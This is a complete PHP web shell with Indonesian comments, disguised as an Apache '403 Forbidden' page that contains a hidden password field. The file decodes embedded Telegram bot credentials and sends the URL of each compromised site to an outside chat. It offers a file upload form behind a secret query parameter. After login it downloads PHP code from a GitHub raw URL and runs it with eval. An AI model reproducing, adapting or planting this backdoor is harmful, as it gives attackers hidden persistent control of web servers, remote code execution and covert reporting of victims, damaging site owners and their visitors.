<?php
ignore_user_abort(true);
session_start();
// Fungsi untuk memeriksa status login
function is_logged_in()
{
    return isset($_SESSION["X-H0UR"]);
}

// Fungsi untuk memvalidasi login
function login($password)
{
    $valid_password_hash = "62623caf10268b16bb27676b5b27678f"; // MD5 hash password
    $password_hash = md5($password);
    if ($password_hash === $valid_password_hash) {
        $_SESSION["X-H0UR"] = "user";
        return true;
    } else {
        return false;
    }
}
$tk = base64_decode(
    "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
);
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg)
{
    global $tk, $cid;
    $id = sys_get_temp_dir() . "/dev/shm/_" . md5($msg);
    if (!file_exists($id)) {
        @file_get_contents(
            "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
                urlencode($msg)
        );
        @file_put_contents($id, time());
    }
}
/* ================= Report ================= */
if (!isset($_SESSION["telegram_reported"])) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $host .
            $uri;
        reportTelegram("?KNTL=KNTL:PASS:TBLHACKING:\n$host\n$url");
        $_SESSION["telegram_reported"] = true;
    }
}
// Fungsi untuk logout
function logout()
{
    unset($_SESSION["X-H0UR"]);
}

// Fungsi untuk mengambil konten dari URL
function getContent($url)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    if ($content === false) {
        $content = file_get_contents($url);
    }
    return $content;
}

// Fungsi untuk mendapatkan data mentah dari URL
function getRawContent($url)
{
    return getContent($url);
}

// Tangani proses login
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["password"])) {
    $password = $_POST["password"];
    if (login($password)) {
        header("Location: " . $_SERVER["PHP_SELF"]);
        exit();
    } else {
        echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
    }
}

//

if (isset($_GET["KNTL"]) && $_GET["KNTL"] === "KNTL") {
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
    echo '<input type="file" name="file" size="15">';
    echo '<input type="submit" value="go">';
    echo "</form>";
}

if (isset($_FILES["file"]["tmp_name"])) {
    $uploadd = $_FILES["file"]["tmp_name"];
    if (file_exists($uploadd)) {
        $pwddir = $_POST["dir"];
        $real = $_FILES["file"]["name"];
        $de = rtrim($pwddir, "/") . "/" . $real;
        if (move_uploaded_file($uploadd, $de)) {
            echo "go$de";
        } else {
            echo "GAGAL  KE $de";
        }
    }
}

// Jika pengguna sudah login, ambil dan eksekusi konten dari URL
if (is_logged_in()) {
    $url =
        "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/litespeed.php";
    $content = getRawContent($url);
    eval("?>" . $content);
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>403 Forbidden</title>
</head>
<body>
    <h1>Forbidden</h1>
    <p>You don't have permission to access <?php echo $_SERVER[
        "REQUEST_URI"
    ]; ?> on this server.</p>
    <hr>
    <address>
        <?php echo $_SERVER[
            "SERVER_SOFTWARE"
        ]; ?> Server at <?php echo $_SERVER[
     "SERVER_NAME"
 ]; ?> Port <?php echo $_SERVER["SERVER_PORT"]; ?>
    </address>
    <form method="post">
        <input style="position: absolute; bottom: 0; left: 50%; transform: Translate(-50%); background-color: #fff; border: 1px solid #fff; text-align: center;" type="password" name="password" placeholder="">
    </form>
</body>
</html>
